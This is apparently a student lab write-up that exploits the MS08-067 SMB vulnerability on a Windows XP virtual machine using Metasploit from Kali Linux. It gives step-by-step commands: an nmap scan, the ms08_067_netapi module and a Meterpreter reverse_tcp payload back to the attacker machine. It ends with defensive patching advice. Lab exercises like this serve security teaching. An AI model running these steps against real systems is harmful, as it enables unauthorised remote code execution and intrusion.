Exploiting MS08-067 Vulnerability Using Metasploit Framework
Aim
To exploit the MS08-067 vulnerability in a Windows XP virtual machine using the Metasploit Framework from Kali Linux and obtain a Meterpreter shell.

Requirements
Attacker Machine
Kali Linux
Metasploit Framework
Nmap

Target Machine
Windows XP (32-bit, vulnerable to MS08-067)

Network
VirtualBox
Host-Only Adapter

Vulnerability Details
Name: MS08-067 Windows Server Service Vulnerability
CVE: CVE-2008-4250
Type: Remote Code Execution
Port: 445 (SMB)

Affected OS: Windows XP, Windows Server 2003

Step-by-Step Exploitation Procedure
Step 1: Find Target IP (Windows XP)
ipconfig

Step 2: Find Attacker IP (Kali Linux)
ip a

Step 3: Scan Target Using Nmap
nmap -sV 192.168.56.101


(Confirm that port 445 is open)

Step 4: Start Metasploit Framework
msfconsole

Step 5: Search for MS08-067 Exploit
search ms08_067

Step 6: Select the Exploit Module
use exploit/windows/smb/ms08_067_netapi

Step 7: View Exploit Options
show options

Step 8: Set Target IP Address
set RHOSTS 192.168.56.101

Step 9: Set Attacker IP Address
set LHOST 192.168.56.102

Step 10: Set Payload
set payload windows/meterpreter/reverse_tcp

Step 11: Execute the Exploit
exploit

Step 12: Verify Successful Exploitation
sysinfo
getuid

Step 13: Get Command Shell (Optional)
shell

Result
The Windows XP virtual machine was successfully exploited using the MS08-067 vulnerability, and a Meterpreter session was obtained, proving remote code execution.

Conclusion
This experiment demonstrates that unpatched legacy systems are highly vulnerable to known exploits. Applying security patches, enabling firewalls, and disabling unnecessary services are essential to prevent such attacks.
